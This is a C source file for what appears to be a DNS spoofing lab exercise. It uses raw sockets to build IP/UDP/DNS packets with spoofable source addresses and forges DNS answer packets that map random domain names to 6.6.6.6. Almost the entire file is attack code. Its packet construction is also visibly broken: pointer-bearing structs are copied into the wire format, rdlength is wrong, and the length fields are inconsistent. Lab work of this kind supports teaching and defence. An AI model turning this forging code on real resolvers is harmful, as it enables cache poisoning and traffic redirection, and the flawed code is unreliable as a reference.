// ----udp.c------
// This sample program must be run by root lol! 
// 
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for 
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
// 
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>
#include <arpa/inet.h>

#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100
     


// Can create separate header file (.h) for all headers' structure

// The IP header's structure

struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    //    unsigned char      iph_flag;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
	unsigned short int query_id;
	unsigned short int flags;
	unsigned short int QDCOUNT;
	unsigned short int ANCOUNT;
	unsigned short int NSCOUNT;
	unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd {
	unsigned short int  type;
	unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)
#pragma pack ( 1 )
struct RES_RECORD {
    unsigned char *name;
    unsigned short type;
    unsigned short class;
    uint32_t ttl;
    unsigned short rdlength;
    unsigned char *rdata;
};

unsigned int checksum(uint16_t *usBuff, int isize)
{
	unsigned int cksum=0;
	for(;isize>1;isize-=2){
	    cksum+=*usBuff++;
    }
	if(isize==1) {
        cksum+=*(uint16_t *)usBuff;
    }


	return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
	struct ipheader *tempI=(struct ipheader *)(buffer);
	struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
	struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
	tempH->udph_chksum=0;
	sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
	sum+=checksum((uint16_t *) tempH,len);

	sum+=ntohs(IPPROTO_UDP+len);
	

	sum=(sum>>16)+(sum & 0x0000ffff);
	sum+=(sum>>16);

	return (uint16_t)(~sum);
	
}

unsigned short csum(unsigned short *buf, int nwords) 
{
    unsigned long sum;

    for(sum=0; nwords>0; nwords--)

            sum += *buf++;

    sum = (sum >> 16) + (sum &0xffff);

    sum += (sum >> 16);

    return (unsigned short)(~sum);

}


void dns_q(char *src_ip, char *dst_ip, char *query, char *dst_buffer, unsigned int *dst_packetLength) 
{
    char *buffer = dst_buffer;
    // Our own headers' structures

    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));



    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    
	dns->flags=htons(FLAG_Q);
    //only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);


    //query string
    strcpy(data,query);
    int length= strlen(data)+1;



    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.
    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(src_ip);
    // The destination IP address
    ip->iph_destip = inet_addr(dst_ip);
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved

    // Destination port number

    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
 

    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
    *dst_packetLength = packetLength;
}
    

void dns_a (
    char *src_ip, 
    char *dst_ip, 
    char *query, 
    char *ip_answer, 
    char *dst_buffer, 
    unsigned int *dst_packetLength) 
{

    char *buffer = dst_buffer;
    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *) buffer;
    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    //standart response
	dns->flags=htons(FLAG_R);
    //only 1 query, so the count should be one.
	dns->QDCOUNT=htons(1);
    //only 1 answer
    dns->ANCOUNT=htons(1);

    //query string
    strcpy(data, query);
    int length = strlen(data)+1;

    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);


    strcpy(data+length+sizeof(struct dataEnd),query);
    struct RES_RECORD *answer=(struct RES_RECORD*)(data+length+sizeof(struct dataEnd)+length - sizeof(void*));
    answer->type = htons(1);
    answer->class = htons(1);
    answer->ttl = htonl(82400);
    answer->rdlength = htons(2);
    answer->rdata = inet_addr(ip_answer);


    //struct RES_RECORD *additional = (struct RES_RECORD*)(data+length+sizeof(*end)            +length        - sizeof(void*) +             sizeof(*answer));
    //                                                   QUERY NAME  ^^ OFFSET OF CLASS+TYPE  ^ DNS ANSWER     ^ OFFSET STRUCT RES_RECORD ^ OFFSET


    strcpy(data+length+sizeof(*end)+length        - sizeof(void*) +             sizeof(*answer), "Test");
    

    

    //printf("name offset:      %d name size:      %d\n", (int)&answer->name - (int)answer, strlen(answer->name)+1);
    // printf("type offset:      %d type size:      %d\n", (int)&answer->type - (int)answer, sizeof(answer->type));
    // printf("class offset:     %d class size:     %d\n", (int)&answer->class - (int)answer, sizeof(answer->class));
    // printf("ttl offset:       %d ttl size:       %d\n", (int)&answer->ttl - (int)answer, sizeof(answer->ttl));
    // printf("rdlength offset:  %d rdlength size:  %d\n", (int)&answer->rdlength - (int)answer, sizeof(answer->rdlength));
    // printf("rdata offset:     %d rdata size:     %d\n", (int)&answer->rdata - (int)answer, sizeof(answer->rdata));
    // int class_offset = (int)&answer->class - (int)answer;
    // int ttl_offset = (int)&answer->ttl - (int)answer;
    //printf("ttl offset - class offset = %d\n", ttl_offset - class_offset);

    

    

    // for(int i = 0; i < 50; i++) {
    //     printf("%x ", *(data + i));
    // }
    // printf("\n");
    dns->query_id=rand(); // transaction ID for the query packet, use random #



    // Fabricate the IP header or we can use the

    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay


    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD) + 5 + sizeof(struct RES_RECORD));
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD) + 5 + sizeof(struct RES_RECORD));


    //printf("Packet length = %d\n", packetLength);
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP
    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(src_ip);
    // The destination IP address
    ip->iph_destip = inet_addr(dst_ip);
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
    // Destination port number
    udp->udph_destport = htons(53);
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));


    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
    *dst_packetLength = packetLength;
}

int main(int argc, char *argv[])
{
    // socket descriptor
    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0 ) // if socket fails to be created 
        printf("socket error\n");

    // Inform the kernel do not fill up the packet structure. we will build our own...
    int one = 1;
    const int *val = &one;
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
        printf("error\n");	
        exit(-1);
    }

    //dns_q(argc, argv);
    char *src_ip = "127.0.0.1";
    char *dst_ip = "127.0.0.1";
    struct sockaddr_in sin, din;

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);
    // IP addresses
    sin.sin_addr.s_addr = inet_addr(src_ip); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(dst_ip); // this is the first argument we input into the program

    
    // buffer to hold the packet
    char buffer[PCKT_LEN];
    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    unsigned int packetLength = 0;

    char query[10];
    strcpy(query, "\4aaaa\3com");

    for(int i = 0; i < 1; i++) {

        //randomize query
        for(int i = 1; i < 5; i++) {
            query[i] = 'a' + rand() % ('z'-'a');
        }

        dns_a(src_ip, dst_ip, query, "6.6.6.6", buffer, &packetLength);
        //dns_q(src_ip, dst_ip, query, buffer, &packetLength);

        printf("Query: %s\n", query);
        //printf("Packet length: %d\n", packetLength);
        
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        }
    }


    close(sd);
    return 0;
}

